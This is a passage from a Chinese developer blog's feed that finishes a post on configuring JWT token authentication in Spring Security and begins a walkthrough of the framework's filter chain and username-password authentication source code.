&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">antMatchers&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpMethod&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">OPTIONS&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/**&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">antMatchers&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/swagger-ui/index.html&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">antMatchers&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/test/**&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * web 安全配置
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpSecurity http&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Enable CORS and disable CSRF
&lt;/span>&lt;span style="color:#75715e">&lt;/span> http &lt;span style="color:#f92672">=&lt;/span> http&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cors&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">and&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">csrf&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">disable&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// Set session management to stateless
&lt;/span>&lt;span style="color:#75715e">&lt;/span> http &lt;span style="color:#f92672">=&lt;/span> http
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sessionManagement&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sessionCreationPolicy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>SessionCreationPolicy&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">STATELESS&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">and&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// exception handler
&lt;/span>&lt;span style="color:#75715e">&lt;/span> http&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">exceptionHandling&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticationEntryPoint&lt;/span>&lt;span style="color:#f92672">(&lt;/span>globalExceptionHandler&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">accessDeniedHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>globalExceptionHandler&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// Set permissions on endpoints
&lt;/span>&lt;span style="color:#75715e">&lt;/span> http&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authorizeRequests&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#75715e">// Our public endpoints
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">antMatchers&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/foundation/api/example/**&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">permitAll&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">anyRequest&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">authenticated&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// Add JWT token filter
&lt;/span>&lt;span style="color:#75715e">&lt;/span> http&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addFilterBefore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
jwtTokenFilter&lt;span style="color:#f92672">,&lt;/span>
UsernamePasswordAuthenticationFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Bean&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> AuthenticationManager &lt;span style="color:#a6e22e">authenticationManagerBean&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticationManagerBean&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="结语">结语&lt;/h2>
&lt;p>这就是自定义 token 身份验证与配置的全部工作内容。由于 spring security 大量使用了组合与设计模式使得任何开发者都可以定义出各式各样的身份验证逻辑，所以只要你的自定义程序可以嵌合到 security 框架里并且可以很好的工作，那他就是适合你的身份验证。&lt;/p></description></item><item><title>Spring security 如何进行身份认证</title><link>https://www.chucklin.net/post/springsecurity_authentication/</link><pubDate>Fri, 02 Apr 2021 10:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/springsecurity_authentication/</guid><description>&lt;h2 id="filter">Filter&lt;/h2>
&lt;p>Spring security 的运行依赖于一系列 filter chains ，其中每一组 filter chain 对应了一种类型的 request type。
当引入 spring security 框架时，会将 security filter chains 注册到 servlet filter chain 上，维护这些 security filter chains 的类就是 FilterChainProxy。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/filter.png" alt="">&lt;/p>
&lt;h2 id="virtualfilterchain">VirtualFilterChain&lt;/h2>
&lt;p>上图中展示了默认情况下 security 加载的 11 个过滤器。这些过滤器组成的 chains 被命名为 VirtualFilterChain，用以和原生的 servlet chain 做区分。&lt;/p>
&lt;p>VirtualFilterChain 有一个 List&lt;!-- raw HTML omitted --> additionalFilters 字段持有 security 加载的所有过滤器。只要通过遍历 additionalFilters 的每个元素并调用每个元素上的 doFilter 方法，就可以实现请求在链条上传播的功能。
不过，调用每个元素的 doFilter 方法这个操作的实现方式有点特殊，就像下面这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
currentPosition&lt;span style="color:#f92672">++;&lt;/span>
Filter nextFilter &lt;span style="color:#f92672">=&lt;/span> additionalFilters&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">g&lt;/span>&lt;span style="color:#f92672">(&lt;/span>currentPosition &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>UrlUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">buildRequestUrl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>firewalledRequest&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; at position &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> currentPosition &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; of &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> size
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; in additional filter chain; firing Filter: &amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> nextFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getSimpleName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
nextFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
&lt;li>在调用过滤器的 doFilter 方法时， this 对象会被传递到被调用过滤器中。&lt;/li>
&lt;li>在调用对象的方法中手动维护  过滤器迭代的索引。&lt;/li>
&lt;/ol>
&lt;p>这是有点取巧的设计：采用将 this 传递到被调用过滤器中的方式，是为了在调用对象中使用回调——这里的回调就是指调用下一个过滤器的 doFilter 方法；通过手动维护过滤器迭代的索引，保证了在回调时准确的获取下一个迭代器。&lt;/p>
&lt;p>这样的做法在避免了维护一套复杂数据结构的前提下，使这条过链上的所有迭代器都拥有了下一个迭代器元素的指针，从而间接实现了「责任链设计模式」。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">VirtualFilterChain&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> FilterChain &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> FilterChain originalChain&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Filter&lt;span style="color:#f92672">&amp;gt;&lt;/span> additionalFilters&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> FirewalledRequest firewalledRequest&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> size&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> currentPosition &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">VirtualFilterChain&lt;/span>&lt;span style="color:#f92672">(&lt;/span>FirewalledRequest firewalledRequest&lt;span style="color:#f92672">,&lt;/span>
FilterChain chain&lt;span style="color:#f92672">,&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Filter&lt;span style="color:#f92672">&amp;gt;&lt;/span> additionalFilters&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">originalChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> chain&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">additionalFilters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> additionalFilters&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> additionalFilters&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">size&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">firewalledRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> firewalledRequest&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>ServletRequest request&lt;span style="color:#f92672">,&lt;/span> ServletResponse response&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>currentPosition &lt;span style="color:#f92672">==&lt;/span> size&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>UrlUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">buildRequestUrl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>firewalledRequest&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; reached end of additional filter chain; proceeding with original chain&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// Deactivate path stripping as we exit the security filter chain
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">firewalledRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">reset&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
originalChain&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
currentPosition&lt;span style="color:#f92672">++;&lt;/span>
Filter nextFilter &lt;span style="color:#f92672">=&lt;/span> additionalFilters&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>currentPosition &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>UrlUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">buildRequestUrl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>firewalledRequest&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; at position &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> currentPosition &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; of &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> size
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; in additional filter chain; firing Filter: &amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> nextFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getSimpleName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
nextFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="abstractauthenticationprocessingfilter-dofilter">AbstractAuthenticationProcessingFilter. doFilter()&lt;/h2>
&lt;p>security 加载的每种过滤器都有自己的使命和职责，但是这次只关注和身份证验证相关的过滤器： JwtTokenFilter/UsernamePasswordAuthenticationFilter&lt;/p>
&lt;p>security 中大部分和身份认证相关的过滤器都继承自 AbstractAuthenticationProcessingFilter，UsernamePasswordAuthenticationFilter 也不例外。父类 AbstractAuthenticationProcessingFilter 是一个 Servlet Filter 接口的实现，定义了身份认证的核心处理逻辑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>ServletRequest req&lt;span style="color:#f92672">,&lt;/span> ServletResponse res&lt;span style="color:#f92672">,&lt;/span> FilterChain chain&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
HttpServletRequest request &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>HttpServletRequest&lt;span style="color:#f92672">)&lt;/span> req&lt;span style="color:#f92672">;&lt;/span>
HttpServletResponse response &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>HttpServletResponse&lt;span style="color:#f92672">)&lt;/span> res&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 当前请求还未认证
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>requiresAuthentication&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
chain&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Request is to process authentication&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
Authentication authResult&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 执行认证功能
&lt;/span>&lt;span style="color:#75715e">&lt;/span> authResult &lt;span style="color:#f92672">=&lt;/span> attemptAuthentication&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>authResult &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// return immediately as subclass has indicated that it hasn&amp;#39;t completed
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// authentication
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
sessionStrategy&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">onAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authResult&lt;span style="color:#f92672">,&lt;/span> request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InternalAuthenticationServiceException failed&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;An internal error occurred while trying to authenticate the user.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
failed&lt;span style="color:#f92672">);&lt;/span>
unsuccessfulAuthentication&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> failed&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthenticationException failed&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Authentication failed
&lt;/span>&lt;span style="color:#75715e">&lt;/span> unsuccessfulAuthentication&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> failed&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// Authentication success
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>continueChainBeforeSuccessfulAuthentication&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
chain&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
successfulAuthentication&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> chain&lt;span style="color:#f92672">,&lt;/span> authResult&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果当前请求还未认证，父类 AbstractAuthenticationProcessingFilter 会调用由子类 UsernamePasswordAuthenticationFilter 实现的 attemptAuthentication 进行身份认证。&lt;/p>
&lt;h2 id="usernamepasswordauthenticationfilter-attemptauthentication">UsernamePasswordAuthenticationFilter. attemptAuthentication()&lt;/h2>
&lt;blockquote>
&lt;p>在父类方法中定义共通处理内容，但将自定义部分留给子类来完成的设计方式，是模板方法设计模式的体现。&lt;/p>
&lt;/blockquote>
&lt;p>attemptAuthentication 方法将用户名与密码封装为一个 UsernamePasswordAuthenticationToken 对象，再将此对象交由 AuthenticationManager 接口的实现类 ProviderManager 进行处理。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> Authentication &lt;span style="color:#a6e22e">attemptAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span>
HttpServletResponse response&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> AuthenticationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>postOnly &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>request&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMethod&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AuthenticationServiceException&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Authentication method not supported: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
String username &lt;span style="color:#f92672">=&lt;/span> obtainUsername&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">);&lt;/span>
String password &lt;span style="color:#f92672">=&lt;/span> obtainPassword&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>username &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>password &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
username &lt;span style="color:#f92672">=&lt;/span> username&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">trim&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
UsernamePasswordAuthenticationToken authRequest &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">(&lt;/span>
username&lt;span style="color:#f92672">,&lt;/span> password&lt;span style="color:#f92672">);&lt;/span>
